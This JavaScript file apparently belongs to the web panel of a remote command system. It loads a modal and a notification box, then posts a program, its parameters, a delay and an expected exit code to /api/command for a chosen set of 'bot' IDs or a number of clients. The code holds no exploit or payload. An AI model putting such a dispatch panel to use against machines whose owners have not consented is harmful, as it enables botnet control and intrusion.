// Dynamically load the modal
async function loadCommandModal() {
    const response = await fetch('/static/html/partial.command-modal.html');
    if (response.ok) {
        const modalHtml = await response.text();
        document.getElementById('command-modal-section').innerHTML = modalHtml;

        // Load the notification system
        await loadNotificationSystem();

        // Initialize modal-related JavaScript after loading
        initializeCommandModal();
    } else {
        console.error('Failed to load command modal:', response.status);
    }
}

// Load the notification system
async function loadNotificationSystem() {
    const response = await fetch('/static/html/partial.notification.html');
    if (response.ok) {
        const notificationHtml = await response.text();
        document.body.insertAdjacentHTML('beforeend', notificationHtml);

        // Add event listener to close the notification
        const closeButton = document.getElementById('notification-close');
        closeButton.addEventListener('click', () => {
            document.getElementById('notification').classList.add('hidden');
        });
    } else {
        console.error('Failed to load notification system:', response.status);
    }
}

// Show a notification
function showNotification(message, type) {
    const notification = document.getElementById('notification');
    const messageSpan = document.getElementById('notification-message');

    if (!notification || !messageSpan) {
        console.error('Notification system is not loaded.');
        return;
    }

    messageSpan.textContent = message;
    notification.className = type; // Apply the type class (success or error)
    notification.classList.remove('hidden');
}

// Initialize the command modal
function initializeCommandModal() {
    const modal = document.getElementById('command-modal');
    const openModalButton = document.getElementById('open-command-modal');
    const closeButton = modal.querySelector('.close-button');
    const commandForm = document.getElementById('command-form');
    const clientSelection = document.getElementById('client-selection');
    const clientIdsInput = document.getElementById('client-ids-input');
    const numClientsInput = document.getElementById('num-clients-input');
    const toggleOptionalButton = document.getElementById('toggle-optional');
    const optionalInputs = document.getElementById('optional-inputs');

    // Open and close modal
    openModalButton.addEventListener('click', () => {
        modal.style.display = 'block';
    });

    closeButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Toggle client selection inputs
    clientSelection.addEventListener('change', () => {
        if (clientSelection.value === 'by-id') {
            clientIdsInput.style.display = 'inline-block';
            numClientsInput.style.display = 'none';
        } else if (clientSelection.value === 'by-number') {
            clientIdsInput.style.display = 'none';
            numClientsInput.style.display = 'inline-block';
        }
    });

    // Toggle optional inputs
    toggleOptionalButton.addEventListener('click', () => {
        if (optionalInputs.style.display === 'none') {
            optionalInputs.style.display = 'block';
            toggleOptionalButton.textContent = '▲ Hide Optional Inputs';
        } else {
            optionalInputs.style.display = 'none';
            toggleOptionalButton.textContent = '▼ Show Optional Inputs';
        }
    });

    // Handle form submission
    commandForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        const botIds = clientSelection.value === 'by-id' ? clientIdsInput.value.trim() : '';
        const numClients = clientSelection.value === 'by-number' ? numClientsInput.value.trim() : '';
        const cmdId = document.getElementById('cmd-id-input').value.trim();
        const program = document.getElementById('program-input').value.trim();
        const params = document.getElementById('params-input').value.trim();
        const delay = document.getElementById('delay-input').value.trim() || '0';
        const expectedCode = document.getElementById('expected-code-input').value.trim() || '0';

        if (!botIds && !numClients) {
            showNotification('Please specify either a list of client IDs or the number of clients to target.', 'error');
            return;
        }

        if (!program) {
            showNotification('Please enter a program.', 'error');
            return;
        }

        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `bot_ids=${encodeURIComponent(botIds)}&num_clients=${encodeURIComponent(numClients)}&cmd_id=${encodeURIComponent(cmdId)}&program=${encodeURIComponent(program)}&params=${encodeURIComponent(params)}&delay=${encodeURIComponent(delay)}&expected_code=${encodeURIComponent(expectedCode)}`,
            });

            if (response.ok) {
                const result = await response.json();
                showNotification(`Command sent successfully! Command ID: ${result.command_id}`, 'success');
            } else {
                const error = await response.json();
                showNotification(`Error: ${error.message}`, 'error');
            }
        } catch (err) {
            showNotification(`Failed to send command: ${err.message}`, 'error');
        }

        modal.style.display = 'none';
    });
}

// Call the function to load the command modal
loadCommandModal();

document.addEventListener("DOMContentLoaded", () => {
    const openModalButton = document.getElementById('open-command-modal');
    if (openModalButton) {
        openModalButton.addEventListener('click', () => {
            const modal = document.getElementById('command-modal');
            if (modal) {
                modal.style.display = 'block';
            }
        });
    } else {
        console.error('Open command modal button not found.');
    }
});